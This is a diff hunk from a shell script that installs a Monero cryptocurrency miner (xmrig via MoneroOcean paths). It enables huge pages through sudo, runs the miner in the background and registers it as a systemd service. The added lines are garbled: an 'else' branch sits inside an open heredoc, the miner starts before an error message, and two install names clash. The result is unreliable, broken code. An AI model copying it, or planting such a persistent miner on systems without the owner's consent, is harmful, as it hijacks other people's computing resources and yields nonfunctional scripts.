@@ -173,6 +173,26 @@ chmod +x $HOME/minershell-main/miner.sh
 
     echo "[*] Creating minershell-main_miner systemd service"
     cat >/tmp/minershell-main_miner.service <<EOL
+    
+else
+
+  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
+    echo "[*] Enabling huge pages"
+    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
+    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
+  fi
+
+  if ! type systemctl >/dev/null; then
+
+    echo "[*] Running miner in the background (see logs in $HOME/moneroocean/xmrig.log file)"
+    /bin/bash $HOME/moneroocean/miner.sh --config=$HOME/moneroocean/config_background.json >/dev/null 2>&1
+    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
+    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
+
+  else
+
+    echo "[*] Creating moneroocean_miner systemd service"
+    cat >/tmp/moneroocean_miner.service <<EOL
 [Unit]
 Description=Monero miner service
 
